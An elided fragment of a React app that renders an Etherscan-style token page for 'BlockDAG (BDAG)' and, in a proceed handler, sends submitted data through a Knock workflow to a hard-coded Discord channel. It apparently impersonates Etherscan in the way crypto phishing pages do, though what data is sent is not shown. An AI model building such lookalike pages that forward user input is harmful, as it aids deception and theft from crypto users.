...
import ethereumLogoLight from './assets/images/blockdag.png';
...
function App() {
  ...
  const menuItems = [
    {
      href: 'https://etherscan.io/tokencheck-tool?t=0x9ca8530ca349c966fe9ef903df17a75b8a778927',
      id: 'check-supply',
      icon: RefreshCw,
    ...
    {
      href: 'https://etherscan.io/contactus?id=5&a=0x9ca8530ca349c966fe9ef903df17a75b8a778927',
      id: 'update-name',
      icon: User,
  ...
  const handleProceed = async (e: any) => {
    ...
    await knock.objects.setChannelData(
      ...
      import.meta.env.VITE_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1399529221583274005",
          },
        ],
      }
    );
    await knock.workflows.trigger("blockdag", {
      data: {
              ...
              <div>
                <h1 className="font-medium flex items-center">
                  <div className='text-gray-800'>
                    <span className='text-xl font-semibold'>Token </span> BlockDAG <span className='text-[#6C757D]'>(BDAG)</span>
                  </div>
            ...
            <div className="bg-white rounded-lg border p-6 px-4 shadow-md">
              ...
              <div className="space-y-4">
                <div className='space-y-1.5'>
                  ...
                  <p className="text-sm">45,999,999,000 BDAG</p>
                </div>

                <div className='space-y-1.5'>
                  <p className="text-xs text-gray-500 uppercase tracking-wide">HOLDERS</p>
                  <p className="text-sm">80,190</p>
                </div>
              </div>
            </div>
